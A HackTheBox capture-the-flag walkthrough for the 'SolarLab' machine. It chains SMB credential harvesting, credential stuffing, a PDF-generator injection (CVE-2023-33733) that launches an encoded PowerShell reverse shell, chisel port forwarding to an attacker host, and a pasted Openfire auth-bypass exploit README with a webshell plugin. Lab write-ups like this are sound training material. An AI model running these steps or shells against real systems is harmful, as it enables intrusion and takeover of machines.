
# 🌞 HackTheBox - SolarLab 

This is a walkthrough of the HTB machine **SolarLab**, where I gained root access by chaining multiple vulnerabilities and using port forwarding techniques. The machine offered a good mix of enumeration, exploitation via known CVEs, and privilege escalation through misconfigured services.

---

## 🛰 Initial Enumeration

I started with a standard Nmap scan:

```bash
nmap -sC -sV -oA scan 10.10.11.XXX

The most interesting open ports were:

80 (HTTP)

445 (SMB)

## 📁 SMB Enumeration

Using smbclient, I accessed the share Documents:

smbclient //10.10.11.XXX/Documents

Inside, I found a file called details-file.xlsx that contained user information: usernames, passwords, and emails.

## Web Enumeration

The website on port 80 had no useful functionality, so I scanned again with all ports:

nmap -p- 10.10.11.XXX

I found port 6791 open, hosting a login panel. Using BurpSuite’s Cluster Bomb, I tried credential stuffing. No valid logins were found initially.

Upon inspecting the usernames again, I noticed Blake Byte, whose username format was different (Blake.Byte), so I tested BlakeB with all known passwords.

✅ A password worked, and I logged into the application as BlakeB.

## 📄 PDF Generation Exploit (CVE-2023–33733)
The app had a “Travel Approval” form that generated a PDF. I intercepted the request using BurpSuite, and in the travel_request parameter, I injected a base64-encoded PowerShell reverse shell:

import os
os.system("powershell -enc <Base64EncodedPayload>")
With a Netcat listener:

nc -lvnp 4444
✅ I got a reverse shell as blake.

## 🔁 Port Forwarding Openfire (Port 9090)
While exploring, I noticed a user named openfire. I confirmed with netstat that ports 9090/9091 were listening internally.

To access them, I uploaded chisel.exe to the Windows machine and forwarded the port:

# Attacker (Kali)
./chisel server -p 9001 --reverse

# Victim (Windows)
chisel.exe client <attacker-ip>:9001 R:9090:127.0.0.1:9090
Navigating to http://127.0.0.1:9090 gave me the Openfire login panel, showing version 4.7.4.

## 🔓 Openfire Exploit (CVE-2023–32315)
I found a GitHub repo detailing CVE-2023–32315. It included a Python script that extracted credentials from the vulnerable version.

# CVE-2023-32315
Openfire Console Authentication Bypass Vulnerability with RCE plugin

## Setup
```
git clone https://github.com/miko550/CVE-2023-32315.git
cd CVE-2023-32315
pip3 install -r requirements.txt
```
## Usage
```
python3 CVE-2023-32315.py -t http://127.0.0.1:9090
python3 CVE-2023-32315.py -l lists.txt
```
### Step
1. Run exploit
2. login with newly added user
3. goto tab plugin > upload plugin `openfire-management-tool-plugin.jar`
4. goto tab server > server settings > Management tool
5. Access websehll with password "123"
## Vulnerable Openfire Docker
```
docker pull nasqueron/openfire:4.7.1
sudo docker run --name openfire -d --restart=always --publish 9090:9090 --publish 5222:5222 --publish 7777:7777 --volume /srv/do>```
## Reference
- https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass
- https://github.com/5rGJ5aCh5oCq5YW9/CVE-2023-32315exp

Running the exploit gave me openfire login credentials.

After logging in, I went to the Plugins page and uploaded the malicious plugin (.jar) provided in the same repo.

The plugin named "Management Tool" appeared with a default password: 123.

Using it, I accessed a command execution interface.

I tested with:

whoami
And confirmed code execution.

Using the same PowerShell reverse shell payload, I got a shell as the openfire user.

## 🔐 Privilege Escalation to Administrator
From the openfire shell, I found a directory named embedded-db which hinted at further privileges.

Using smbexec.py, I logged in as administrator:

smbexec.py openfire@10.10.11.XXX
But command execution was restricted. So I reused the PowerShell reverse shell for the third time.

✅ This time, I got a reverse shell as Administrator.

## 🏁 Summarry
Stage	Access Achieved
SMB	Usernames + passwords
Web App (6791)	Login as BlakeB
CVE-2023–33733	Reverse shell as blake
Port Forwarding	Openfire panel (9090)
CVE-2023–32315	Shell as openfire
Reuse reverse shell	Shell as Administrator

## Thanks for reading! ��
This machine combined enumeration, CVEs, and lateral movement in a satisfying way.



